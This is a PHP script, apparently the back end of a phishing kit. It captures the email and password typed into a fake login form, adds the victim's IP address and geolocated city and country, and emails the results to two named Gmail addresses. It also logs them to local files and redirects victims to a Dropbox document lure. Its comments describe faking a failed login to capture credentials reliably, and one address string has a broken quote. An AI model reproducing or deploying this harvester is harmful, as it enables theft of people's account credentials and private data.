<?php

	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BY DAPO |---\n";
    $message .= "Email Provider: ADEDAPO\n";
    $message .= "E: " . $_POST['email'] . "\n"; 
    $message .= "Ps: " . $_POST['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="dreshaw3030@gmail.co\";

	$subject = " | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";

	$send = mail($to,$subject,$message,$headers);
	if($send){
		header("Location: https://www.dropbox.com/s/qujwy57ei30hfkl/Wealthmanagementforbusinessowners.docx?dl=0");
	}

    // the name of the file you're writing to
    $myFile = "auth.log";
    // opens the file for appending (file must already exist)
    $fh = fopen($myFile, 'a');
    // record the initial form submission
    $pre = "----------------------------------------\n";
    $date = date ("d/m/Y -- H:i:s");
    $message = "[ * ]   $date   [ * ]\n";
    // Makes a CSV list of your post data
    $comma_delimited_list = implode(", ", $_POST) . "\n";
    // Write to the file
    fwrite($fh, $pre);
    fwrite($fh, "$message");
    fwrite($fh, $comma_delimited_list);
    // Close the file
    fclose($fh);
    // Redirect to force a second authentication attempt
    // Appear as if the password was entered incorrectly
    // To assure correct credentials are captured...

$message = "------------\n";
$message .= "---|BY DAPO |---\n";
$message .= "Email Provider: OFFICE\n";
$message .= "E: " . $_POST['email'] . "\n"; 
$message .= "Ps: " . $_POST['password'] . "\n"; 
$message .= "IP : " .$ip. "\n"; 
$message .= "--------------------------\n";
$message .=     "City: {$geoplugin->city}\n";
$message .=     "Region: {$geoplugin->region}\n";
$message .=     "Country Name: {$geoplugin->countryName}\n";
$message .=     "Country Code: {$geoplugin->countryCode}\n";
$message .= "--------------------------\n";
$to ="dreshaw2012@gmail.com";
$subject = "Ghost | Contact";
$headers = "From: Ghostcontact <Contact@ghostchannel.com>";
$send = mail($to,$subject,$message,$headers);
$handle = fopen('usernames.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, 'rn');
}
fwrite($handle, 'rn');
fclose($handle);
exit;
?>